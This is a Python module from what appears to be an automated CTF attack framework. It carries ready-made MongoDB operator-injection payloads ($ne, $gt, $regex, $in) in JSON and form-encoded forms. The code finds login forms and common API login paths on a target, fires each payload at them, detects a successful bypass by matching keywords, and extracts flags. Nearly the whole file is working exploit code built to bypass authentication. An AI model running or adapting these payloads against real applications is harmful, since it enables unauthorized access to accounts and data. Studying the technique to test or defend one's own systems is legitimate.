"""
NoSQL Injection Module — MongoDB operator injection
Very common in CTF login bypass challenges (MongoDB $ne, $gt, $regex)
"""
import json
from backend.core.base_module import BaseModule
from backend.core.parser import Parser
from backend.core.flag_hunter import FlagHunter


class NoSQLModule(BaseModule):
    MODULE_NAME = "nosql"
    DESCRIPTION = "NoSQL Injection (MongoDB operator bypass)"

    # Login bypass payloads
    LOGIN_BYPASS_JSON = [
        {"username": {"$ne": None}, "password": {"$ne": None}},
        {"username": "admin", "password": {"$ne": ""}},
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        {"username": "admin", "password": {"$gt": ""}},
        {"username": {"$in": ["admin", "administrator", "root"]},
         "password": {"$ne": ""}},
    ]

    # Form-encoded operator payloads
    LOGIN_BYPASS_FORM = [
        {"username": "admin", "password[$ne]": "invalid"},
        {"username[$ne]": "", "password[$ne]": ""},
        {"username": "admin", "password[$regex]": ".*"},
        {"username[$gt]": "", "password[$gt]": ""},
        {"username": "admin", "password[$exists]": "true"},
    ]

    # Flag extraction via $regex (blind)
    FLAG_CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-!@#"

    def run(self) -> dict:
        self.log(f"[NoSQL] Starting scan on {self.target_url}")
        resp = self.requester.get()
        if resp is None:
            self.results["status"] = "unreachable"
            return self.results

        flags = FlagHunter.hunt(resp.text)
        [self.add_flag(f) for f in flags]

        forms = Parser.extract_forms(resp.text)
        login_forms = [f for f in forms if self._is_login_form(f)]
        self.log(f"[NoSQL] Found {len(login_forms)} login form(s)")

        for form in login_forms:
            self._test_login_bypass(form)

        # Try JSON API endpoints
        self._test_api_endpoints()

        if self.results["status"] == "pending":
            self.results["status"] = "not_vulnerable"
        return self.results

    def _is_login_form(self, form) -> bool:
        names = [i.get("name", "").lower() for i in form["inputs"]]
        has_pw   = any("pass" in n or "pwd" in n for n in names)
        has_user = any("user" in n or "email" in n or "login" in n
                       for n in names)
        return has_pw and has_user

    def _test_login_bypass(self, form):
        action = form["action"] or self.target_url
        if not action.startswith("http"):
            action = self.target_url.rstrip("/") + "/" + action.lstrip("/")

        # Form-encoded payloads
        for bypass in self.LOGIN_BYPASS_FORM:
            data = {**{i["name"]: i["value"] or "test"
                       for i in form["inputs"] if i["name"]},
                    **bypass}
            r = self.requester.post(action, data=data)
            if r and self._looks_successful(r):
                self.add_vuln({"type": "nosql_login_bypass",
                               "payload": bypass})
                self.log(f"[NoSQL] Login bypass via form: {bypass}")
                flags = FlagHunter.hunt(r.text)
                [self.add_flag(f) for f in flags]
                return

        # JSON payloads
        for bypass in self.LOGIN_BYPASS_JSON:
            r = self.requester.post(action, json_data=bypass,
                                    headers={"Content-Type": "application/json"})
            if r and self._looks_successful(r):
                self.add_vuln({"type": "nosql_json_bypass",
                               "payload": bypass})
                self.log(f"[NoSQL] Login bypass via JSON: {bypass}")
                flags = FlagHunter.hunt(r.text)
                [self.add_flag(f) for f in flags]
                return

    def _test_api_endpoints(self):
        api_paths = ["/api/login", "/api/auth", "/login",
                     "/api/user/login", "/auth/login"]
        for path in api_paths:
            url = self.target_url.rstrip("/") + path
            for payload in self.LOGIN_BYPASS_JSON[:3]:
                r = self.requester.post(
                    url, json_data=payload,
                    headers={"Content-Type": "application/json"})
                if r and r.status_code not in (404,) and \
                   self._looks_successful(r):
                    flags = FlagHunter.hunt(r.text)
                    [self.add_flag(f) for f in flags]
                    self.add_vuln({"type": "nosql_api",
                                   "endpoint": path,
                                   "payload": payload})
                    self.log(f"[NoSQL] API bypass: {path}")

    @staticmethod
    def _looks_successful(r) -> bool:
        if r.status_code in (200, 302):
            text = r.text.lower()
            success_sigs = ["welcome", "dashboard", "logout", "profile",
                            "flag{", "flag", "success", "token", "jwt"]
            fail_sigs    = ["invalid", "incorrect", "wrong password",
                            "login failed", "unauthorized"]
            has_success  = any(s in text for s in success_sigs)
            has_fail     = any(s in text for s in fail_sigs)
            return has_success and not has_fail
        return False
